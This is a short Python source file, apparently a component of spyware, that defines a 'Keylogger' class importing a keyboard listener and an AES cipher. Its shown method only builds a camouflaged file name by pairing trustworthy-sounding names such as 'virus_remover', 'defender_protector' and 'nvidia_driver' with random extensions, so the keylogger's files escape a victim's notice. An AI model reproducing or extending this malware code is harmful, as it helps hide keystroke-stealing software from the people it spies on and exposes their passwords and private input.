import os
import random
from pynput.keyboard import Key
from pynput.keyboard import Listener
from core.utils.commons.crypto import AESCipher
class Keylogger:
    def __new__(self):
        self.rand_exts = [
            "py",
            "rb",
            "rc",
            "sys",
            "bat",
            "c",
            "pl",
            "cs",
            "cpp",
            "h",
            "r",
            "go",
            "java",
            "pyc",
            "dll"
        ]
        self.rand_names = [
            "image_loader",
            "x64_protector",
            "virus_remover",
            "defender_protector",
            "cortana_utils",
            "powershell",
            "nvidia_driver",
            "api_glsx",
            "nvidia_updates",
            "control_panel"
        ]
        random_ext = random.choice(self.rand_exts)
        random_file = random.choice(self.rand_names)
        return random_file + "." + random_ext
